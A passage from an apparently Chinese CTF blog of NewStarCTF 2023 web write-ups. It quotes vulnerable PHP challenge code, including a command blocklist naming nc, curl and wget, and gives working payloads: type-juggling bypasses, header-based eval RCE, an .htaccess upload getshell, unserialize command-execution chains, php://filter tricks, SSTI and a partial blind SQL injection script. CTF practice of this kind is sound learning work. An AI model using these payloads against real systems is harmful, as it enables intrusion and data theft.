class="string">&#x27;key3&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$flag2</span> = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¾æ—§æ˜¯æ•°ç»„ç»•è¿‡ï¼Œè¿™é‡Œä¸»è¦æ˜¯æ„é€ NULLï¼Œä½¿å¾—NULL == 0</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 3=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>],<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>)) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$flag3</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å˜é‡è¾“å‡ºçš„ç‰¹æ€§ï¼Œå½“å­—ç¬¦ä¸²è¢«å½“åšæ•°å­—è¾“å‡ºæ—¶ï¼Œä¼šæˆªå–ç¬¬ä¸€ä¸ªéæ•°å­—çš„å­—ç¬¦å‰çš„æ‰€æœ‰æ•°å­—ï¼Œè‹¥ç¬¬ä¸€ä¸ªæ˜¯éæ•°å­—å­—ç¬¦ï¼Œåˆ™ä¼šè¾“å‡º0</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag3</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 4=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>] &gt; <span class="number">2023</span>)&#123;</span><br><span class="line">            <span class="variable">$flag4</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 4&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// extractå‡½æ•°çš„å˜é‡è¦†ç›–æ¼æ´ï¼Œå½“ä¼ å…¥çš„æ•°æ®ç»è¿‡æ­¤å‡½æ•°å¤„ç†æ—¶ï¼Œè‹¥æ•°æ®ä¸­å«æœ‰è„šæœ¬ä¸­ç›¸åŒçš„å˜é‡åï¼Œé‚£ä¹ˆè¯¥æ•°æ®ä¼šè¦†ç›–åŸæ¥çš„å˜é‡ã€‚è¿™é‡Œæœ‰å˜é‡$flag5ï¼Œæ‰€ä»¥å¯ä»¥ä¼ å…¥flag5=...ï¼ˆåªè¦å˜é‡å€¼ä¸å«å­—æ¯æ•°å­—å³å¯ï¼‰</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 5=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‚è€ƒpayloadï¼š<code>GET /?key1[]=1&amp;key2[]=2&amp;key4[]=1&amp;key5=2024s</code>ã€<code>POST key3[]=1&amp;flag5=.</code></p>
<h2 id="NewStarCTF-2023-å…¬å¼€èµ›é“-æ³„æ¼çš„ç§˜å¯†"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-æ³„æ¼çš„ç§˜å¯†" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]æ³„æ¼çš„ç§˜å¯†"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]æ³„æ¼çš„ç§˜å¯†</h2><p>ç›´æ¥æ‰¾<a target="_blank" rel="noopener" href="http://www.zipå³å¯">www.zipå³å¯</a></p>
<h2 id="NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E-1"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E-1" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]R!!C!!E!!"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]R!!C!!E!!</h2><p>gitä¿¡æ¯æ³„éœ²ï¼Œç”¨Githackå¯ä»¥å¾—åˆ°æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123; <span class="comment">// è¿™é‡Œæ£€æŸ¥çš„æ˜¯$staræ˜¯å¦ç¬¦åˆéæ ‡ç‚¹ç¬¦å·ä»¥å¤–çš„å­—ç¬¦+é€’å½’å‡½æ•°çš„è°ƒç”¨ä¸æ›¿æ¢</span></span><br><span class="line">    <span class="comment">//è¯´çš„æ¸…æ¥šç‚¹ï¼Œ[^\W]æ˜¯åŒ¹é…éæ ‡ç‚¹ä»¥å¤–çš„ä»»ä½•å­—ç¬¦ï¼Œè¿™é‡Œçš„ä½œç”¨åº”è¯¥æ˜¯åŒ¹é…å‡½æ•°å</span></span><br><span class="line">    <span class="comment">// \((?R)?\)è½¬ä¹‰å­—ç¬¦\ä¸ç”¨å…³å¿ƒï¼Œè½¬æ¢ä¸‹æ¥å°±æ˜¯((?R)?)ï¼Œ(?R)?è¡¨ç¤ºåŒ¹é…åµŒå¥—çš„å‡½æ•°ï¼Œä½†æ˜¯å‡½æ•°çš„å‚æ•°æ— æ³•å¤„ç†</span></span><br><span class="line">    <span class="comment">// å½“$starç¬¦åˆå‡½æ•°ååŠ åµŒå¥—å‡½æ•°æ—¶ï¼Œå°±å¯ä»¥è¿›å…¥åˆ°ä¸‹ä¸€æ­¥äº†</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»¼ä¸Šï¼Œè¿™æ˜¯ä¸€é“æ— å‚RCEï¼Œæˆ‘ä»¬åªéœ€è¦å¼•ç”¨å‡½æ•°å¹¶ç†è§£å¦‚ä½•åµŒå¥—å‡½æ•°å³å¯</p>
<p>ç”±äº<code>scandir</code>ã€<code>var_dump</code>ã€<code>get_defined_vars</code>è¢«è¿‡æ»¤ï¼Œä¸”å‡½æ•°å¤„ç†ä¸äº†å‚æ•°ï¼Œè¿™æ—¶å€™å¯ä»¥è€ƒè™‘<code>getallheaders()</code></p>
<p>ä¼ å…¥<code>?star=eval(next(getallheaders()));</code>ï¼Œè¿™é‡Œæ˜¯å…ˆè·å–HTTPè¯·æ±‚å¤´çš„ä¿¡æ¯ï¼Œç„¶åç”¨<code>next()</code>è°ƒç”¨ä¸‹ä¸€ä¸ªå…ƒç´ ï¼ˆæŒ‡è¯·æ±‚å¤´ä¸­çš„æŸä¸ªå…ƒç´ ï¼‰ï¼ŒæŠŠè¿™ä¸ªå…ƒç´ å½“åšå‚æ•°ä¼ ç»™<code>eval()</code>æ‰§è¡Œï¼ˆè¿™é‡Œevalæ˜¯èƒ½å¤„ç†å‚æ•°çš„ï¼Œå› ä¸ºå®ƒåŒ¹é…çš„æ˜¯<code>[^\W]</code>ï¼Œè€Œ<code>next(getallheaders())</code>åŒ¹é…çš„æ˜¯<code>(?R)?</code>ï¼Œä¸èƒ½å¤„ç†å‚æ•°ï¼Œåªèƒ½è°ƒç”¨å‡½æ•°ï¼‰</p>
<img src="/2024/03/20/buuctf/buu/image-20240326142757191.png" class="" title="image-20240326142757191">

<p>å‘ç°ç›®æ ‡æ˜¯ä¿®æ”¹UAï¼ˆUser-Agentï¼‰ï¼Œç„¶åå‘½ä»¤æ‰§è¡Œå³å¯</p>
<h2 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Upload-again"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Upload-again" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Upload again!"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Upload again!</h2><p>è¿‡æ»¤äº†phpåç¼€çš„æ–‡ä»¶ï¼ŒåŒæ—¶è¿˜å¯¹æ–‡ä»¶å†…å®¹ä½œæ£€æŸ¥ï¼Œç”¨&lt; script language=â€phpâ€ &gt;ç»•è¿‡</p>
<img src="/2024/03/20/buuctf/buu/image-20240326145245713.png" class="" title="image-20240326145245713">

<p>è¿™é‡Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥è®¿é—®1.jpgæ¥getshellï¼Œéœ€è¦ç”¨.htaccessæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å¯ä»¥å®ç°çš„åŠŸèƒ½åŒ…æ‹¬ä½†ä¸é™äºï¼šç”¨æˆ·è‡ªåŠ¨é‡å®šå‘ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€æ”¹å˜ä½ çš„æ–‡ä»¶æ‰©å±•åç­‰ç­‰ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ åè®¿é—®1.jpgå³å¯getshell</p>
<img src="/2024/03/20/buuctf/buu/image-20240326150006272.png" class="" title="image-20240326150006272">

<h2 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Unserializeï¼Ÿ"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Unserializeï¼Ÿ" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Unserializeï¼Ÿ"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Unserializeï¼Ÿ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>ç®€å•çš„ååºåˆ—åŒ–ï¼Œæ³¨æ„ä¸Šä¼ çš„æ—¶å€™è¦URLç¼–ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&#x27;nl /*&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ï¼ˆè¿˜æ²¡æµ‹è¯•ï¼Œåœ¨å†™é¢˜ç›®çš„æ—¶å€™å¹³å°æ­£åœ¨ç»´æŠ¤ï¼Œäºæ˜¯å°±è·‘æ­¥å»äº†ï¼‰</p>
<p>ï¼ˆå¹³å°æœ‰ç‚¹é—®é¢˜ï¼Œæˆ‘è¿˜ä»¥ä¸ºå†™é”™äº†ï¼ŒæŠŠwpæ¬ä¸Šå»ä¹‹åå‘ç°ä¹Ÿæ²¡æœ‰å›æ˜¾ï¼‰</p>
<h2 id="NewStarCTF-2023-å…¬å¼€èµ›é“-include-0ã€‚0"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-include-0ã€‚0" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]include 0ã€‚0"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]include 0ã€‚0</h2><p>æ–‡ä»¶åŒ…å«æœ‰å¤šç§æ–¹æ³•ï¼Œè¿™é‡Œå°±è¯´æœ€å¸¸è§çš„ä¸€ä¸ªï¼šä¼ªåè®®base64ç¼–ç ç›´æ¥è¯»å–</p>
<p>æºç è¿‡æ»¤äº†baseï¼Œç”¨urlåŒç¼–ç ç»•è¿‡ï¼š<code>?file=php://filter/read=convert.bas%256564-encode/resource=flag.php</code>ï¼ˆæŠŠeç¼–ç ä¸¤æ¬¡ï¼‰</p>
<h2 id="NewStarCTF-2023-å…¬å¼€èµ›é“-æ¸¸æˆé«˜æ‰‹"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-æ¸¸æˆé«˜æ‰‹" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]æ¸¸æˆé«˜æ‰‹"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]æ¸¸æˆé«˜æ‰‹</h2><p>åœ¨æ§åˆ¶å°å†…å°†gameScoreæ”¹ä¸º100000ä»¥ä¸Šçš„æ•°å­—å°±è¡Œï¼ˆgameScoreå¯ä»¥åœ¨è°ƒè¯•å™¨å†…çœ‹ï¼‰</p>
<img src="/2024/03/20/buuctf/buu/image-20240327135616508.png" class="" title="image-20240327135616508">

<h2 id="NewStarCTF-2023-å…¬å¼€èµ›é“-GenShin"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-GenShin" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]GenShin"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]GenShin</h2><p>æŠ“åŒ…å‘ç°å“åº”å¤´æœ‰æ–‡ä»¶</p>
<img src="/2024/03/20/buuctf/buu/image-20240327135927184.png" class="" title="image-20240327135927184">

<p>æ ¹æ®æç¤ºä¼ ä¸€ä¸ªnameè¿›å»</p>
<img src="/2024/03/20/buuctf/buu/image-20240327140038917.png" class="" title="image-20240327140038917">

<p>ä¹Ÿè®¸æ˜¯sstiï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰</p>
<img src="/2024/03/20/buuctf/buu/image-20240327140519214.png" class="" title="image-20240327140519214">

<p>è¢«è¿‡æ»¤äº†ï¼Œåº”è¯¥æ˜¯å­˜åœ¨sstiçš„ã€‚</p>
<p>æµ‹è¯•å‘ç°%æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨<code>&#123;%print%&#125;</code>è¾“å‡º</p>
<img src="/2024/03/20/buuctf/buu/image-20240327142514721.png" class="" title="image-20240327142514721">

<p>çœ‹çœ‹å­ç±»æœ‰ä»€ä¹ˆå¯ä»¥ç”¨çš„</p>
<img src="/2024/03/20/buuctf/buu/image-20240327142845116.png" class="" title="image-20240327142845116">

<p>ç”±äºinitè¢«è¿‡æ»¤æ‰äº†ï¼Œè€ƒè™‘ç”¨attrç»•è¿‡</p>
<img src="/2024/03/20/buuctf/buu/image-20240327143312921.png" class="" title="image-20240327143312921">

<img src="/2024/03/20/buuctf/buu/image-20240327143716819.png" class="" title="image-20240327143716819">

<p>æ‰¾åˆ°popenä¹‹åå°±å¯ä»¥æ“ä½œäº†</p>
<img src="/2024/03/20/buuctf/buu/image-20240327143908532.png" class="" title="image-20240327143908532">

<p>:::info</p>
<p>è¿™é¢˜æˆ‘æ²¡æœ‰æ£€æµ‹å‡ºæ¥ç©ºæ ¼æ˜¯å¦è¢«è¿‡æ»¤æ‰ï¼Œå› ä¸ºcat /flagä¸­é—´æœ‰ç©ºæ ¼ä¼šæŠ¥400ï¼Œä¸çŸ¥æ˜¯ä»€ä¹ˆåŸå› ã€‚</p>
<p>å¯¹äº†ï¼Œpopenä¹Ÿè¢«è¿‡æ»¤æ‰äº†</p>
<p>:::</p>
<h2 id="NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E-2"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E-2" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]R!!!C!!!E!!!"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]R!!!C!!!E!!!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>:::warning</p>
<p>execå‡½æ•°åœ¨æµè§ˆå™¨ä¸­æ˜¯æ²¡æœ‰ååº”çš„ï¼Œæ‰€ä»¥åªèƒ½é å†™æ–‡ä»¶çš„æ–¹å¼æŠŠå‘½ä»¤çš„è¿è¡Œç»“æœè¡¨ç¤ºå‡ºæ¥</p>
<p>:::</p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;ls /|te&#x27;&#x27;e /var/www/html/2.txt&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;qwejaskdjnlka = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="NewStarCTF-2023-å…¬å¼€èµ›é“-medium-sql"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-medium-sql" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]medium_sql"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]medium_sql</h2><p>è¿‡æ»¤çš„éƒ¨åˆ†å¯ä»¥è€ƒè™‘å¤§å°å†™ç»•è¿‡</p>
<p>ç”±äºåœ¨è€ƒè™‘è”åˆæ³¨å…¥çš„æ—¶å€™æç¤ºè¯´ä¸èƒ½ç”¨unionï¼Œé‚£å¤šåŠæ˜¯ç›²æ³¨äº†</p>
<img src="/2024/03/20/buuctf/buu/image-20240327152504565.png" class="" title="image-20240327152504565">

<p>æµ‹è¯•ä¸€ä¸‹å¸ƒå°”ç›²æ³¨</p>
<img src="/2024/03/20/buuctf/buu/image-20240329163359515.png" class="" title="image-20240329163359515">

<img src="/2024/03/20/buuctf/buu/image-20240329163415239.png" class="" title="image-20240329163415239">

<p>ç¡®è®¤å‡ºæ˜¯å¸ƒå°”ç›²æ³¨ï¼Œå¯ä»¥å†™è„šæœ¬äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://b1e9c46d-af66-4936-a026-9b3a1a236c3c.node5.buuoj.cn:81/?id=TMP11503\&#x27; And &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">res</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;compulsory&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checklength</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        payload = <span class="string">&#x27;if((length(database())=&#123;&#125;),1,0)--+&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        str2 = url + payload</span><br><span class="line">        <span class="comment"># print(str2)</span></span><br><span class="line">        res = requests.get(url=str2)</span><br><span class="line">        <span class="keyword">if</span> check(res):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Database\&#x27;s length is :&#x27;</span>, i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkdataname</span>():</span><br><span class="line">    databasename = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right = <span 